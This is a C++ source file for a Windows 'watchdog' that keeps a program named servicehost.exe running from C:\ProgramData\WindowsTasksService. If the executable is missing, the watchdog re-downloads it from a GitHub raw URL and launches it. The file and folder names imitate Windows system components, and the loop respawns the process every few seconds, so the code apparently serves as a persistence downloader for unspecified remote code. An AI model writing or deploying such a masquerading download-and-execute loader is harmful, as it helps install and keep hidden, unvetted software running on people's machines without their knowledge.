#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <csignal>
#include <cstring>
#include <tlhelp32.h>
#include <fstream>

const std::string PROCESS_PATH = "C:\\ProgramData\\WindowsTasksService\\servicehost.exe";
const std::string PROCESS_NAME = "servicehost.exe";
const std::string DOWNLOAD_URL = "https://github.com/Ameterius/links/raw/main/servicehost.exe";
const int CHECK_INTERVAL = 5; // Интервал проверки в секундах

bool isProcessRunning(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        return false;
    }

    do {
        if (std::string(pe.szExeFile) == processName) {
            CloseHandle(hSnapshot);
            return true;
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);
    return false;
}

void startProcess(const std::string& processPath) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(
        processPath.c_str(),   // No module name (use command line)
        NULL,                  // Command line
        NULL,                  // Process handle not inheritable
        NULL,                  // Thread handle not inheritable
        FALSE,                 // Set handle inheritance to FALSE
        0,                     // No creation flags
        NULL,                  // Use parent's environment block
        NULL,                  // Use parent's starting directory 
        &si,                   // Pointer to STARTUPINFO structure
        &pi)                   // Pointer to PROCESS_INFORMATION structure
    ) {
        std::cerr << "Failed to start process: " << processPath << std::endl;
        std::cerr << "CreateProcess failed (" << GetLastError() << ")." << std::endl;
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

bool downloadFile(const std::string& url, const std::string& filePath) {
    HRESULT result = URLDownloadToFile(NULL, url.c_str(), filePath.c_str(), 0, NULL);
    return result == S_OK;
}

void watchdog() {
    while (true) {
        if (!isProcessRunning(PROCESS_NAME)) {
            std::cout << "Process " << PROCESS_NAME << " is not running. Restarting..." << std::endl;
            std::ifstream file(PROCESS_PATH);
            if (file) {
                file.close();
                startProcess(PROCESS_PATH);
            } else {
                std::cout << "File " << PROCESS_PATH << " not found. Downloading..." << std::endl;
                if (downloadFile(DOWNLOAD_URL, PROCESS_PATH)) {
                    std::cout << "File downloaded successfully. Starting process..." << std::endl;
                    startProcess(PROCESS_PATH);
                } else {
                    std::cerr << "Failed to download file." << std::endl;
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(CHECK_INTERVAL));
    }
}

int main() {
    signal(SIGINT, [](int signum) {
        std::cout << "WatchDog terminated by signal " << signum << std::endl;
        exit(signum);
    });

    watchdog();

    return 0;
}